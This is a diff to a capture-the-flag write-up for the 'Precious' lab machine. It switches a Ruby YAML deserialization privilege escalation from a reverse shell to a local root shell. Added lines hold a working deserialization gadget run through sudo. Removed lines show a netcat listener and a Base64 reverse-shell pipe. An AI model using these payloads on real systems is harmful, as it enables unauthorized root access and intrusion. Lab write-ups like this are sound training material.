@@ -544,6 +544,8 @@ Let's use the credentials we just found to move laterally:
 ```
 
 ```
+henry@10.10.11.189's password:
+<SNIP>
 henry@precious:~$
 ```
 
@@ -637,17 +639,13 @@ able to execute arbitrary commands. And since we can execute this script as
 
 ### Preparation
 
-First, I'll setup a listener to receive the shell.
+The goal is to obtain an elevated shell.
 
-```sh
-❯ rlwrap nc -lvnp "9002"
-```
-
-Then, I'll select a payload from
+I'll select a payload from
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)
 to exploit this vulnerability.
 
-However, there's two payloads to choose from depending on the Ruby version in
+However, there's two gadgets to choose from depending on the Ruby version in
 use, so let's retrieve Precious's Ruby version.
 
 ```sh
@@ -660,13 +658,10 @@ ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
 
 Therefore, I'll choose the one for Ruby versions after `2.7.3`.
 
-However, we still need to come up with a payload to use with it!
+However, we still need to come up with a payload to use with the YAML gadget! I
+want to obtain an elevated shell, so I'll just execute `/bin/bash`.
 
-I want to obtain a reverse shell, so I'll choose the Base64 encoded version of
-the 'Bash -i' payload from [RevShells](https://www.revshells.com/) configured to
-obtain a `/bin/bash` shell.
-
-Then, I'll create a `dependencies.yml` file to execute this payload:
+Then, I'll create a `dependencies.yml` file in `/tmp` to execute this binary:
 
 ```yml
 ---
@@ -686,11 +681,9 @@ Then, I'll create a `dependencies.yml` file to execute this payload:
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
-             git_set: /bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i
+             git_set: /bin/bash -i
          method_id: :resolve
 ```
-
-I'll transfer it to Precious.
 
 ### Exploitation
 
@@ -700,14 +693,11 @@ Let's exploit the Ruby deserialization vulnerability to execute our payload:
 henry@precious:/tmp$ sudo "/usr/bin/ruby" "/opt/update_dependencies.rb"
 ```
 
-If we check our listener:
-
 ```
-connect to [10.10.14.5] from (UNKNOWN) [10.10.11.189] 60456
 root@precious:/tmp#
 ```
 
-It caught the reverse shell!
+Yay!
 
 ### Stabilizing the shell
 
@@ -746,7 +736,8 @@ I rated both the user and root flags as 'Easy' to obtain. The foothold was quite
 easy to identify and fairly straightforward to exploit. The privilege escalation
 was a bit harder to identify, since it involved first moving laterally from
 `ruby` to `henry`, and then identifying a deserialization vulnerability in a
-Ruby script. Thanks to PayloadAllTheThings, it was really easy to exploit
-though.
+Ruby script. Thanks to
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), it
+was really easy to exploit though.
 
 Thanks for reading!
